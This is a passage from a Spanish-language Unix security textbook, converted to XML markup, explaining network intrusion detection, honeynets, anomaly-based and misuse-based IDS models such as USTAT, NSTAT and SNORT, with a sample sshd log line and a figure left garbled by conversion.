<!--l. 479--><para>Acabamos de ver s&#x00F3;lo algunos ejemplos de campos de una trama TCP/IP que, al presentar determinados
valores, pueden ser indicativos de un ataque; sin embargo, no todo es tan sencillo como comprobar ciertos
par&#x00E1;metros de cada paquete que circula por uno de nuestros segmentos. Tambi&#x00E9;n es posible y necesario que
un detector de intrusos basado en red sea capaz de noti&#xFB01;car otros ataques que no se pueden apreciar en
una &#x00FA;nica trama; uno de estos ataques es la presencia de peticiones que, aunque por s&#x02CA;&#x0131; mismas no sean
sospechosas, por su repetici&#x00F3;n en un intervalo de tiempo m&#x00E1;s o menos peque~no puedan ser indicativas de un
ataque (por ejemplo, barridos de puertos horizontales o verticales). Otros ataques dif&#x02CA;&#x0131;ciles de detectar
analizando tramas de forma independiente son las negaciones de servicio distribuidas (DDoS,
Distributed Denial of Service), justamente por el gran n&#x00FA;mero de or&#x02CA;&#x0131;genes que el ataque tiene por
de&#xFB01;nici&#x00F3;n.
<!--br/-->
<!--br/-->Seg&#x00FA;n lo expuesto hasta ahora en este punto, puede parecer que los sistemas de detecci&#x00F3;n de
intrusos basados en red funcionan &#x00FA;nicamente mediante la detecci&#x00F3;n de patrones; realmente,
esto no es as&#x02CA;&#x0131;: en principio, un detector de intrusos basado en red puede estar basado en la
detecci&#x00F3;n de anomal&#x02CA;&#x0131;as, igual que lo puede estar uno basado en m&#x00E1;quinas. No obstante, esta
aproximaci&#x00F3;n es minoritaria; aunque una intrusi&#x00F3;n generar&#x00E1; probablemente comportamientos anormales
(por ejemplo, un tr&#x00E1;&#xFB01;co excesivo entre el sistema atacante y el atacado) susceptibles de ser
detectados y eliminados, con demasiada frecuencia estos sistemas no detectar&#x00E1;n la intrusi&#x00F3;n hasta que
la misma se encuentre en un estado avanzado. Este problema hace que la mayor parte de
IDSes basados en red que existen actualmente funcionen siguiendo modelos de detecci&#x00F3;n de usos
indebidos.
<!--br/-->
<!--br/-->Para &#xFB01;nalizar este punto dedicado a los sistemas de detecci&#x00F3;n de intrusos basados en red es necesario hablar
de las honeynets (<citation>[?]</citation>) &#x2013; literalmente, &#x2018;redes de miel&#x2019; &#x2013;. Se trata de un concepto muy parecido al de los
honeypots, de los que ya hemos hablado, pero extendido ahora a redes completas: redes dise~nadas para ser
comprometidas, formadas por sistemas reales de todo tipo que, una vez penetrados, permiten capturar y
analizar las acciones que est&#x00E1; realizando el atacante para as&#x02CA;&#x0131; poder aprender m&#x00E1;s sobre aspectos como sus
t&#x00E9;cnicas o sus objetivos. Realmente, aunque la idea general sea com&#x00FA;n, existen dos grandes diferencias de
dise~no entre un tarro de miel y una honeynet: por un lado, esta &#x00FA;ltima evidentemente es una
red completa que alberga diferentes entornos de trabajo, no se trata de una &#x00FA;nica m&#x00E1;quina;
por otro, los sistemas dentro de esta red son sistemas reales, en el sentido de que no simulan

ninguna vulnerabilidad, sino que ejecutan aplicaciones t&#x02CA;&#x0131;picas (bases de datos, sistemas de
desarrollo&#x2026;) similares a las que podemos encontrar en cualquier entorno de trabajo &#x2018;normal&#x2019;.
El objetivo de una honeynet no es la decepci&#x00F3;n, sino principalmente conocer los movimientos
de un pirata en entornos semireales, de forma que aspectos como sus vulnerabilidades o sus
con&#xFB01;guraciones incorrectas se puedan extrapolar a muchos de los sistemas que cualquier empresa posee
en la actualidad; de esta forma podemos prevenir nuevos ataques exitosos contra entornos
reales.
<!--br/-->
<!--br/-->En el funcionamiento de una &#x2018;red de miel&#x2019; existen dos aspectos fundamentales y especialmente
cr&#x02CA;&#x0131;ticos, que son los que introducen la gran cantidad trabajo de administraci&#x00F3;n extra que una
honeynet implica para cualquier organizaci&#x00F3;n. Por un lado, tenemos el control del &#xFB02;ujo de los
datos: es vital para nuestra seguridad garantizar que una vez que un sistema dentro de la
honeynet ha sido penetrado, este no se utilice como plataforma de salto para atacar otras
m&#x00E1;quinas, ni de nuestra organizaci&#x00F3;n ni de cualquier otra; la &#x2018;red de miel&#x2019; ha de permanecer
perfectamente controlada, y por supuesto aislada del resto de los segmentos de nuestra organizaci&#x00F3;n. En
segundo lugar, otro aspecto b&#x00E1;sico es la captura de datos, la monitorizaci&#x00F3;n de las actividades
que un atacante lleva a cabo en la honeynet. Recordemos que nuestro objetivo principal era
conocer los movimientos de la comunidad pirata para poder extrapolarlos a sistemas reales,
por lo que tambi&#x00E9;n es muy importante para el correcto funcionamiento de una honeynet una
correcta recogida de datos generados por el atacante: ha de ser capturada toda la informaci&#x00F3;n
posible de cada acci&#x00F3;n, de una forma poco agresiva (esto es, sin tener que realizar grandes
cambios en cada uno de los sistemas) y por supuesto sin que el atacante se entere. Adem&#x00E1;s
(muy importante), estos datos recogidos nunca se han de mantener dentro del per&#x02CA;&#x0131;metro de la
honeynet, ya que si fuera as&#x02CA;&#x0131; cualquier pirata podr&#x02CA;&#x0131;a destruirlos con una probabilidad demasiado
elevada.
<!--br/-->
<!--br/-->El concepto de honeynet es relativamente nuevo dentro del mundo de la seguridad y, en concreto, de los
sistemas de detecci&#x00F3;n de intrusos; a pesar de ello, se trata de una idea muy interesante que
presumiblemente va a extenderse de una forma m&#x00E1;s o menos r&#x00E1;pida (no todo lo r&#x00E1;pida que nos
gustar&#x02CA;&#x0131;a, ya que implantar y explotar una honeynet no es algo ni trivial, ni mucho menos
r&#x00E1;pido); cada d&#x02CA;&#x0131;a m&#x00E1;s, las herramientas de seguridad no se conforman con detectar problemas
conocidos, sino que tratan de anticiparse a nuevas vulnerabilidades que a&#x00FA;n no se han publicado
pero que pueden estar &#x2013; y de hecho est&#x00E1;n &#x2013; presentes en multitud de sistemas. Conocer cuanto
antes cualquier avance de la comunidad underground es algo vital si queremos lograr este
objetivo.
<!--br/-->
<!--br/-->Como antes hemos comentado, los sistemas de detecci&#x00F3;n de intrusos basados en red, de los que hemos
hablado a lo largo de este punto, son con diferencia los m&#x00E1;s utilizados actualmente en sistemas en
explotaci&#x00F3;n; no obstante, como casi cualquier herramienta relacionada con la seguridad, estos sistemas no
son ninguna panacea, y su implantaci&#x00F3;n ha de verse complementada con una correcta con&#xFB01;guraci&#x00F3;n de
elementos como nuestro cortafuegos corporativo o, por supuesto, los sistemas de detecci&#x00F3;n basados en host.
Veremos m&#x00E1;s adelante, en este mismo cap&#x02CA;&#x0131;tulo, que ambos tipos de IDSes son igualmente necesarios en
nuestro entorno de trabajo.
  </para></section><!--end section--><!--l. 569--><section 
role="section"><title><abbrev role="title-mark">18.6</abbrev><anchor 
   id="x1-28600018.6"  ></anchor>Detecci&#x00F3;n de anomal&#x02CA;&#x0131;as</title>
<!--l. 570--><para>  Desde que en 1980 James P. Anderson propusiera la detecci&#x00F3;n de anomal&#x02CA;&#x0131;as como un m&#x00E9;todo v&#x00E1;lido para
detectar intrusiones en sistemas inform&#x00E1;ticos (<citation>[?]</citation>), la l&#x02CA;&#x0131;nea de investigaci&#x00F3;n m&#x00E1;s activa (esto es, la m&#x00E1;s
estudiada, pero no por ello la m&#x00E1;s extendida en entornos reales) es la denominada Anomaly Detection IDS,
IDSes basados en la detecci&#x00F3;n de anomal&#x02CA;&#x0131;as. La idea es a priori muy interesante: estos modelos de
detecci&#x00F3;n conocen lo que es &#x2018;normal&#x2019; en nuestra red o nuestras m&#x00E1;quinas a lo largo del tiempo,
desarrollando y actualizando conjuntos de patrones contra los que comparar los eventos que se
producen en los sistemas. Si uno de esos eventos (por ejemplo, una trama procedente de una
m&#x00E1;quina desconocida) se sale del conjunto de normalidad, autom&#x00E1;ticamente se cataloga como
sospechoso.
<!--br/-->

<!--br/-->Los IDSes basados en detecci&#x00F3;n de anomal&#x02CA;&#x0131;as se basan en la premisa de que cualquier ataque o intento de
ataque implica un uso anormal de los sistemas (<citation>[?]</citation>, <citation>[?]</citation>&#x2026;). Pero, &#x00BF;c&#x00F3;mo puede un sistema conocer lo que es y
lo que no es &#x2018;normal&#x2019; en nuestro entorno de trabajo? Para conseguirlo, existen dos grandes
aproximaciones (<citation>[?]</citation>): o es el sistema el que es capaz de aprenderlo por s&#x02CA;&#x0131; mismo (bas&#x00E1;ndose por
ejemplo en el comportamiento de los usuarios, de sus procesos, del tr&#x00E1;&#xFB01;co de nuestra red&#x2026;) o
bien se le especi&#xFB01;ca al sistema dicho comportamiento mediante un conjunto de reglas. La
primera de estas aproximaciones utiliza b&#x00E1;sicamente m&#x00E9;todos estad&#x02CA;&#x0131;sticos (medias, varianzas&#x2026;),
aunque tambi&#x00E9;n existen modelos en los que se aplican algoritmos de aprendizaje autom&#x00E1;tico; la
segunda aproximaci&#x00F3;n consiste en especi&#xFB01;car mediante un conjunto de reglas los per&#xFB01;les de
comportamiento habitual bas&#x00E1;ndose en determinados par&#x00E1;metros de los sistemas (con la di&#xFB01;cultad a~nadida
de decidir cu&#x00E1;les de esos par&#x00E1;metros que con mayor precisi&#x00F3;n delimitan los comportamientos
intrusivos).
<!--br/-->
<!--br/-->En el primero de los casos (el basado en m&#x00E9;todos estad&#x02CA;&#x0131;sticos), el detector observa las actividades de
los elementos del sistema, activos &#x2013; sujetos &#x2013;, pasivos &#x2013; objetos &#x2013; o ambos, y genera para
cada uno de ellos un per&#xFB01;l que de&#xFB01;ne su comportamiento; dicho per&#xFB01;l es almacenado en el
sistema, y se actualiza con determinada frecuencia envejeciendo la informaci&#x00F3;n m&#x00E1;s antigua y
priorizando la m&#x00E1;s fresca. El comportamiento del usuario en un determinado momento se guarda
temporalmente en otro per&#xFB01;l, denominado &#x2018;per&#xFB01;l actual&#x2019; (current pro&#xFB01;le), y a intervalos regulares se
compara con el almacenado previamente en busca de desviaciones que puedan indicar una
anomal&#x02CA;&#x0131;a.
<!--br/-->
<!--br/-->En <citation>[?]</citation> se de&#xFB01;nen diferentes tipos de datos o medidas que pueden ser &#x00FA;tiles en la elaboraci&#x00F3;n de estos
per&#xFB01;les:
     </para><orderedlist 
>
     <listitem><anchor 
   id="x1-286002x1"  ></anchor>
     <!--l. 613--><para>Intensidad de la actividad. Re&#xFB02;ejan el ratio de progreso de la actividad en el sistema, para
     lo cual recogen datos a intervalos muy peque~nos &#x2013; t&#x02CA;&#x0131;picamente entre un minuto y una hora
     &#x2013;. Estas medidas detectan r&#x00E1;fagas de comportamiento (por ejemplo, una excesiva generaci&#x00F3;n de
     peticiones de entrada/salida en un cierto intervalo) que en espacios de tiempo m&#x00E1;s amplios no
     podr&#x02CA;&#x0131;an ser detectadas.
     </para></listitem>
     <listitem><anchor 
   id="x1-286004x2"  ></anchor>
     <!--l. 619--><para>Num&#x00E9;ricas. Se trata de medidas de la actividad cuyo resultado se puede representar en forma
     de valor num&#x00E9;rico, como el n&#x00FA;mero de &#xFB01;cheros le&#x02CA;&#x0131;dos por cierto usuario en una sesi&#x00F3;n o la cantidad
     de veces que ese usuario se ha equivocado al teclear su contrase~na de acceso al sistema.
     </para></listitem>
     <listitem><anchor 
   id="x1-286006x3"  ></anchor>
     <!--l. 623--><para>Categ&#x00F3;ricas. Las medidas categ&#x00F3;ricas son aquellas cuyo resultado es una categor&#x02CA;&#x0131;a individual,
     y miden la frecuencia relativa o la distribuci&#x00F3;n de una actividad determinada con respecto a
     otras actividades o categor&#x02CA;&#x0131;as; por ejemplo, cual es la relaci&#x00F3;n entre la frecuencia de acceso a
     un determinado directorio del sistema en comparaci&#x00F3;n con la de acceso a otro. Seguramente
     la palabra &#x2018;categor&#x02CA;&#x0131;a&#x2019; no es la m&#x00E1;s afortunada (por lo menos, no la m&#x00E1;s clara), ya que bajo
     este t&#x00E9;rmino se pueden englobar tanto a objetos (por ejemplo, &#xFB01;cheros) como a eventos (por
     ejemplo, llamadas a la funci&#x00F3;n crypt()) del sistema; esta de&#xFB01;nici&#x00F3;n gen&#x00E9;rica puede resultar m&#x00E1;s
     sencilla si distinguimos entre categor&#x02CA;&#x0131;as globales e individuales: en castellano plano, podemos
     entender las categor&#x02CA;&#x0131;as globales como acciones muy gen&#x00E9;ricas dentro de un entorno, mientras
     que las categor&#x02CA;&#x0131;as individuales ser&#x02CA;&#x0131;an la particularizaci&#x00F3;n para un elemento determinado del
     sistema. As&#x02CA;&#x0131;, una categor&#x02CA;&#x0131;a global puede ser la formada por el conjunto de accesos remotos a la
     m&#x00E1;quina, mientras que una individual ser&#x02CA;&#x0131;a la formada por los accesos desde una determinada
     ubicaci&#x00F3;n f&#x02CA;&#x0131;sica.
     </para></listitem>
     <listitem><anchor 
   id="x1-286008x4"  ></anchor>

     <!--l. 641--><para>Distribuci&#x00F3;n de registros de auditor&#x02CA;&#x0131;a. Esta medida analiza la distribuci&#x00F3;n de las actividades
     generadas en un pasado reciente bas&#x00E1;ndose en los logs generados por las mismas; dicho an&#x00E1;lisis se
     realiza de forma ponderada, teniendo m&#x00E1;s peso las actividades m&#x00E1;s recientes, y es comparado con
     un per&#xFB01;l de actividades &#x2018;habituales&#x2019; previamente almacenado, de forma que permite detectar
     si en un pasado reciente se han generado eventos inusuales.</para></listitem></orderedlist>
<!--l. 649--><para>La segunda aproximaci&#x00F3;n a la que antes hemos hecho referencia era la consistente en indicar mediante un
conjunto de reglas el comportamiento habitual del sistema; suele ser denominada detecci&#x00F3;n de anomal&#x02CA;&#x0131;as
basada en especi&#xFB01;caciones (speci&#xFB01;cation&#x2013;based anomaly detection), y fu&#x00E9; propuesta y desarrollada
inicialmente por Calvin Cheuk Wang Ko y otros investigadores de la Universidad de California en Davis,
durante la segunda mitad de los noventa (<citation>[?]</citation>, <citation>[?]</citation>&#x2026;). La idea en la que se sustentan los sistemas de detecci&#x00F3;n
de anomal&#x02CA;&#x0131;as basados en especi&#xFB01;caciones es que se puede describir el comportamiento &#x2018;deseable&#x2019;
(entendiendo por &#x2018;deseable&#x2019; el comportamiento &#x2018;normal&#x2019;) de cualquier programa cuya seguridad sea cr&#x02CA;&#x0131;tica;
esta descripci&#x00F3;n se realiza en base a una especi&#xFB01;caci&#x00F3;n de seguridad mediante gram&#x00E1;ticas, y se considera una
violaci&#x00F3;n de la seguridad &#x2013; al menos en principio &#x2013; a las ejecuciones de dichos programas que violen su
respectiva especi&#xFB01;caci&#x00F3;n.
<!--br/-->
<!--br/-->Para ver m&#x00E1;s claramente el concepto de la detecci&#x00F3;n de anomal&#x02CA;&#x0131;as basada en especi&#xFB01;caciones, podemos
pensar en la ejecuci&#x00F3;n de un programa que se puede considerar cr&#x02CA;&#x0131;tico, por ser privilegiado: /bin/passwd.
Si conseguimos diferenciar las diferentes ejecuciones de esta orden que se pueden considerar &#x2018;habituales&#x2019;
(por ejemplo, cuando un usuario cambia su contrase~na sin problemas, cuando se equivoca,
cuando el sistema no le deja cambiarla por los motivos t&#x02CA;&#x0131;picos &#x2013; es d&#x00E9;bil, hace poco que la
cambi&#x00F3;&#x2026;&#x2013;), podr&#x02CA;&#x0131;amos especi&#xFB01;car formalmente cada una de estas secuencias de operaci&#x00F3;n. De esta
forma, cada vez que un usuario invoque a /bin/passwd, el sistema de detecci&#x00F3;n monitorizar&#x00E1;
las operaciones que esa llamada genere, y considerar&#x00E1; una intrusi&#x00F3;n a cualquiera que no sea
&#x2018;habitual&#x2019;.
<!--br/-->
<!--br/-->La idea de los sistemas de detecci&#x00F3;n de intrusos basados en la detecci&#x00F3;n de anomal&#x02CA;&#x0131;as es realmente atractiva;
no obstante, existen numerosos problemas a los que estos mecanismos tratan de hacer frente. En primer
lugar podemos pararnos a pensar en las di&#xFB01;cultades que existen a la hora de &#x2018;aprender&#x2019; o
simplemente especi&#xFB01;car lo habitual: si alguien piensa que por ejemplo obtener un patr&#x00F3;n de tr&#x00E1;&#xFB01;co
&#x2018;normal&#x2019; en una red es f&#x00E1;cil, se equivoca; quiz&#x00E1;s establecer un conjunto de procesos habituales
en una &#x00FA;nica m&#x00E1;quina resulte menos complicado, pero tampoco se trata de una tarea trivial.
Adem&#x00E1;s, conforme aumentan las dimensiones de los sistemas (redes con un gran n&#x00FA;mero de
m&#x00E1;quinas interconectadas, equipos con miles de usuarios&#x2026;) estos se hacen cada vez m&#x00E1;s aleatorios e
impredecibles.
<!--br/-->
<!--br/-->Otro gran problema de los sistemas basados en detecci&#x00F3;n de anomal&#x02CA;&#x0131;as radica en la pol&#x02CA;&#x0131;tica de aprendizaje
que &#x00E9;stos sigan (<citation>[?]</citation>); si se trata de esquemas donde el aprendizaje es r&#x00E1;pido, un intruso puede generar
eventos para conseguir un modelo distorsionado de lo &#x2018;normal&#x2019; antes de que el responsable &#x2013;
humano &#x2013; de los sistemas se percate de ello, de forma que el IDS no llegue a detectar un ataque
porque lo considera algo &#x2018;habitual&#x2019;. Si por el contrario el aprendizaje es lento, el IDS considerar&#x00E1;
cualquier evento que se aleje m&#x02CA;&#x0131;nimamente de sus patrones como algo an&#x00F3;malo, generando un gran
n&#x00FA;mero de falsos positivos (falsas alarmas), que a la larga har&#x00E1;n que los responsables de los
sistemas ignoren cualquier informaci&#x00F3;n proveniente del IDS, con los evidentes riesgos que esto
implica.
  </para></section><!--end section--><!--l. 700--><section 
role="section"><title><abbrev role="title-mark">18.7</abbrev><anchor 
   id="x1-28700018.7"  ></anchor>Detecci&#x00F3;n de usos indebidos</title>
<!--l. 701--><para>  Dentro de la clasi&#xFB01;caci&#x00F3;n de los sistemas de detecci&#x00F3;n de intrusos en base a su forma de actuar, la segunda
gran familia de modelos es la formada por los basados en la detecci&#x00F3;n de usos indebidos. Este esquema se
basa en especi&#xFB01;car de una forma m&#x00E1;s o menos formal las potenciales intrusiones que amenazan a un
sistema y simplemente esperar a que alguna de ellas ocurra; para conseguirlo existen cuatro
grandes aproximaciones (<citation>[?]</citation>): los sistemas expertos, los an&#x00E1;lisis de transici&#x00F3;n entre estados, las
reglas de comparaci&#x00F3;n y emparejamiento de patrones (pattern matching) y la detecci&#x00F3;n basada en
modelos.
<!--br/-->

<!--br/-->Los primeros sistemas de detecci&#x00F3;n de usos indebidos, como NIDES (<citation>[?]</citation>), se basaban en los sistemas
expertos para realizar su trabajo; en ellos las intrusiones se codi&#xFB01;can como reglas de la base de
conocimiento del sistema experto, de la forma gen&#x00E9;rica if&#x2013;then (if CONDICI&#x00F3;N then ACCI&#x00F3;N). Cada una de
estas reglas puede detectar eventos &#x00FA;nicos o secuencias de eventos que denotan una potencial
intrusi&#x00F3;n, y se basan en el an&#x00E1;lisis &#x2013; generalmente en tiempo real &#x2013; de los registros de auditor&#x02CA;&#x0131;a
proporcionados por cualquier sistema Unix: esta es una de las principales ventajas de los sistemas
expertos, el hecho de que el mecanismo de registro dentro de Unix venga proporcionado &#x2018;de
serie&#x2019;, ya que de esta forma el sistema de detecci&#x00F3;n trabaja siempre por encima del espacio del
sistema operativo, algo que facilita enormemente su integraci&#x00F3;n dentro de diferentes clones de
Unix.
<!--br/-->
<!--br/-->Podemos pensar en un caso real que nos ayude a comprender el funcionamiento de los sistemas expertos a
la hora de detectar intrusiones; el t&#x02CA;&#x0131;pico ejemplo es la detecci&#x00F3;n de un mismo usuario conectado
simult&#x00E1;neamente desde dos direcciones diferentes. Cada vez que un usuario se autentica correctamente
en el sistema, cualquier Unix genera una l&#x02CA;&#x0131;nea de registro que se guarda en el &#xFB01;chero de log
correspondiente; as&#x02CA;&#x0131;, al conectar a un servidor Linux Slackware v&#x02CA;&#x0131;a SSH, se registra el evento de esta
forma:
</para><section role="center"><title/>
<!--l. 730--><para>

</para><literallayout role="verbatim">
&#x00A0;May&#x00A0;27&#x00A0;03:08:27&#x00A0;rosita&#x00A0;sshd[5562]:&#x00A0;User&#x00A0;toni,&#x00A0;coming&#x00A0;from&#x00A0;anita,&#x00A0;authenticated.
</literallayout>
</section>
<!--l. 735--><para>Al leer este registro, un sistema experto comprobar&#x02CA;&#x0131;a si el usuario toni ya tiene una sesi&#x00F3;n abierta desde una
m&#x00E1;quina diferente de anita; si esta condici&#x00F3;n se cumple (recordemos la forma gen&#x00E9;rica de las reglas del
sistema experto, if&#x2013;then) se realizar&#x02CA;&#x0131;a la acci&#x00F3;n de&#xFB01;nida en la regla correspondiente, por norma generar una
alarma dirigida al responsable de seguridad del sistema.
<!--br/-->
<!--br/-->La segunda implementaci&#x00F3;n de los sistemas de detecci&#x00F3;n de usos indebidos era la basada en los an&#x00E1;lisis de
transici&#x00F3;n entre estados (<citation>[?]</citation>); bajo este esquema, una intrusi&#x00F3;n se puede contemplar como una
secuencia de eventos que conducen al atacante desde un conjunto de estados inicial a un estado
determinado, representando este &#x00FA;ltimo una violaci&#x00F3;n consumada de nuestra seguridad. Cada uno de
esos estados no es m&#x00E1;s que una imagen de diferentes par&#x00E1;metros del sistema en un momento
determinado, siendo el estado inicial el inmediatamente posterior al inicio de la intrusi&#x00F3;n, y el &#x00FA;ltimo de
ellos el resultante de la completitud del ataque; la idea es que si conseguimos identi&#xFB01;car los
estados intermedios entre ambos, seremos capaces de detener la intrusi&#x00F3;n antes de que se haga
efectiva.
<!--br/-->
<!--br/-->Sin duda el sistema de detecci&#x00F3;n basado en el an&#x00E1;lisis de transici&#x00F3;n entre estados m&#x00E1;s conocido es USTAT (<citation>[?]</citation>),
basado en STAT (<citation>[?]</citation>). Este modelo fu&#x00E9; desarrollado inicialmente sobre SunOS 4.1.1 (en la actualidad est&#x00E1;
portado a Solaris 2), y utiliza los registros de auditor&#x02CA;&#x0131;a generados por el C2 Basic Security Module de este
operativo. En USTAT, estos registros del C2-BSM son transformados a otros de la forma <informalequation><graphic 
fileref="unixsec321x.gif"></graphic></informalequation>S, A, O<informalequation><graphic 
fileref="unixsec322x.gif"></graphic></informalequation>,
representando cada uno de ellos un evento de la forma &#x2018;el sujeto S realiza la acci&#x00F3;n A sobre el objeto O&#x2019;; a
su vez, cada elemento de la terna anterior est&#x00E1; formado por diferentes campos que permiten identi&#xFB01;car
un&#x02CA;&#x0131;vocamente el evento representado. El sistema de detecci&#x00F3;n utiliza adem&#x00E1;s una base de datos
&#x2013; realmente, se trata de simples &#xFB01;cheros planos &#x2013; formada principalmente por dos tablas,
una donde se almacenan las descripciones de los diferentes estados (SDT, State Description
Table) y otra en la que se almacenan las transiciones entre estados que denotan un potencial
ataque (SAT, Signature Action Table). Cuando USTAT registre una sucesi&#x00F3;n determinada de
eventos que representen un ataque entrar&#x00E1; en juego el motor de decisiones, que emprender&#x00E1;
la acci&#x00F3;n que se le haya especi&#xFB01;cado (desde un simple mensaje en consola informando de la
situaci&#x00F3;n hasta acciones de respuesta autom&#x00E1;tica capaces de interferir en tiempo real con la
intrusi&#x00F3;n).
<!--br/-->
<!--br/-->La tercera implementaci&#x00F3;n que hab&#x02CA;&#x0131;amos comentado era la basada en el uso de reglas de comparaci&#x00F3;n y
emparejamiento de patrones o pattern matching (<citation>[?]</citation>, <citation>[?]</citation>); en ella, el detector se basa en la premisa de
que el sistema llega a un estado comprometido cuando recibe como entrada el patr&#x00F3;n de la
intrusi&#x00F3;n, sin importar el estado en que se encuentre en ese momento. Dicho de otra forma,
simplemente especi&#xFB01;cando patrones que denoten intentos de intrusi&#x00F3;n el sistema puede ser capaz de
detectar los ataques que sufre, sin importar el estado inicial en que est&#x00E9; cuando se produzca dicha
detecci&#x00F3;n, lo cual suele representar una ventaja con respecto a otros modelos de los que hemos
comentado.
<!--br/-->
<!--br/-->Actualmente muchos de los sistemas de detecci&#x00F3;n de intrusos m&#x00E1;s conocidos (por poner un ejemplo, podemos
citar a SNORT o RealSecure) est&#x00E1;n basados en el pattern matching. Utilizando una base de datos de
patrones que denotan ataques, estos programas se dedican a examinar todo el tr&#x00E1;&#xFB01;co que ven
en su segmento de red y a comparar ciertas propiedades de cada trama observada con las
registradas en su base de datos como potenciales ataques; si alguna de las tramas empareja
con un patr&#x00F3;n sospechoso, autom&#x00E1;ticamente se genera una alarma en el registro del sistema.
En el punto  <ulink 
  url="#x1-29000018.8.2"  ><!--ref: snort--></ulink> hablaremos con m&#x00E1;s detalle del funcionamiento de SNORT, uno de los sistemas
de detecci&#x00F3;n de intrusos basados en red m&#x00E1;s utilizado en entornos con requisitos de seguridad
media.
<!--br/-->

<!--br/-->Por &#x00FA;ltimo, tenemos que hablar de los sistemas de detecci&#x00F3;n de intrusos basados en modelos (<citation>[?]</citation>);
se trata de una aproximaci&#x00F3;n conceptualmente muy similar a la basada en la transici&#x00F3;n entre
estados, en el sentido que contempla los ataques como un conjunto de estados y objetivos,
pero ahora se representa a los mismos como escenarios en lugar de hacerlo como transiciones
entre estados. En este caso se combina la detecci&#x00F3;n de usos indebidos con una deducci&#x00F3;n o un
razonamiento que concluye la existencia o inexistencia de una intrusi&#x00F3;n; para ello, el sistema
utiliza una base de datos de escenarios de ataques, cada uno de los cuales est&#x00E1; formado por una
secuencia de eventos que conforman el ataque. En cada momento existe un subconjunto de esos
escenarios, denominado de escenarios activos, que representa los ataques que se pueden estar
presentando en el entorno; un proceso denominado anticipador analiza los registros de auditor&#x02CA;&#x0131;a
generados por el sistema y obtiene los eventos a veri&#xFB01;car en dichos registros para determinar
si la intrusi&#x00F3;n se est&#x00E1; o no produciendo (realmente, al ser esos registros dependientes de cada
sistema Unix, el anticipador pasa su informaci&#x00F3;n a otro proceso denominado planner, que los
traduce al formato de auditor&#x02CA;&#x0131;a utilizado en cada sistema). El anticipador tambi&#x00E9;n actualiza
constantemente el conjunto de escenarios activos, de manera que este estar&#x00E1; siempre formado por los
escenarios que representan ataques posibles en un determinado momento y no por la base de datos
completa.
<!--br/-->
<!--br/-->Hasta hace poco tiempo no exist&#x02CA;&#x0131;an sistemas de detecci&#x00F3;n de intrusos basados en modelos funcionando en
sistemas reales (<citation>[?]</citation>), por lo que era dif&#x02CA;&#x0131;cil determinar aspectos como su e&#xFB01;ciencia a la hora de detectar
ataques. En 1998 se present&#x00F3; NSTAT (<citation>[?]</citation>), una extensi&#x00F3;n de USTAT (del cual hemos hablado antes) a
entornos distribuidos y redes de computadores, y en el que se combina el an&#x00E1;lisis de transici&#x00F3;n
entre estados con la detecci&#x00F3;n de intrusos basada en modelos. A pesar de todo, este modelo es
el menos utilizado a la hora de detectar ataques y efectuar respuestas autom&#x00E1;ticas ante los
mismos, especialmente si lo comparamos con los basados en la comparaci&#x00F3;n y emparejamiento de
patrones.
<!--br/-->
<!--br/-->Los IDSes basados en la detecci&#x00F3;n de usos indebidos son en principio m&#x00E1;s robustos que los basados
en la detecci&#x00F3;n de anomal&#x02CA;&#x0131;as: al conocer la forma de los ataques, es te&#x00F3;ricamente extra~no que
generen falsos positivos (a no ser que se trate de un evento autorizado pero muy similar al
patr&#x00F3;n de un ataque); es necesario recalcar el matiz &#x2018;te&#x00F3;ricamente&#x2019;, porque como veremos m&#x00E1;s
adelante, la generaci&#x00F3;n de falsos positivos es un problema a la hora de implantar cualquier
sistema de detecci&#x00F3;n. No obstante, en este mismo hecho radica su debilidad: s&#x00F3;lo son capaces de
detectar lo que conocen, de forma que si alguien nos lanza un ataque desconocido para el
IDS &#x00E9;ste no nos noti&#xFB01;car&#x00E1; ning&#x00FA;n problema; como ya dijimos, es algo similar a los programas
antivirus, y de igual manera que cada cierto tiempo es conveniente (en MS-DOS y derivados)
actualizar la versi&#x00F3;n del antivirus usado, tambi&#x00E9;n es conveniente mantener al d&#x02CA;&#x0131;a la base de datos
de los IDSes basados en detecci&#x00F3;n de usos indebidos. A&#x00FA;n as&#x02CA;&#x0131;, seremos vulnerables a nuevos
ataques.
<!--br/-->
<!--br/-->Otro grave problema de los IDSes basados en la detecci&#x00F3;n de usos indebidos es la incapacidad para detectar
patrones de ataque convenientemente camu&#xFB02;ados. Volviendo al ejemplo de los antivirus, pensemos en un
antivirus que base su funcionamiento en la b&#x00FA;squeda de cadenas virales: lo que b&#x00E1;sicamente har&#x00E1; ese
programa ser&#x00E1; buscar cadenas de c&#x00F3;digo hexadecimal pertenecientes a determinados virus en cada uno de los
archivos a analizar, de forma que si encuentra alguna de esas cadenas el software asumir&#x00E1; que
el &#xFB01;chero est&#x00E1; contaminado. Y de la misma forma que un virus puede ocultar su presencia
simplemente cifrando esas cadenas (por ejemplo de forma semialeatoria utilizando eventos del
sistema, como el reloj), un atacante puede evitar al sistema de detecci&#x00F3;n de intrusos sin m&#x00E1;s
que insertar espacios en blanco o rotaciones de bits en ciertos patrones del ataque; aunque
algunos IDSes son capaces de identi&#xFB01;car estas transformaciones en un patr&#x00F3;n, otros muchos no lo
hacen.
  </para></section><!--end section--><!--l. 853--><section 
role="section"><title><abbrev role="title-mark">18.8</abbrev><anchor 
   id="x1-28800018.8"  ></anchor>Implementaci&#x00F3;n real de un IDS</title>
  <figure><title/><blockquote>


<section role="center"><title/>
<!--l. 855--><para>  '
&        $
%
      ___________
                                              '
&          $
%
                                                  ______________
 ___________________________ Router
                        
                         _      
                            _h
                                    h
                                                                  h
                                             h
                                      
 
                                
 
                                          
 
                                                                     
 #
"    
!
                           ____
                           
                         
                        
                      
                    
                   
                  b
                    b
                      b
                        b
                          b
                          b
                             
                               
                                 
                                   
                                     
                                      
                                     b
                                   b
                                 b
                               b
                             b
                            b
                                                         ______ 
                                                _____ 
                                                ____________
                                                      
                                                       
                                               
                                                
                                                 _____
                                                    __
                  ___-
                                       _____-
                                                        _ 
                                                          ?
                                 _                                   ___
                                             _____
                          FW      1
                               2                                    34
        INet
                                                    LAN
</para></section>
<blockquote role="caption"><title role="caption"><anchor 
   id="x1-2880011"  ></anchor>Figura&#x00A0;18.1</title><para>Puntos cl&#x00E1;sicos de defensa entre un atacante y un objetivo.</para></blockquote>

  </blockquote></figure> Vamos a tratar ahora de de&#xFB01;nir unas pautas para crear un sistema distribuido de detecci&#x00F3;n de intrusos,
capaz de generar respuestas autom&#x00E1;ticas, alarmas, o simplemente logs a distintos niveles de nuestra
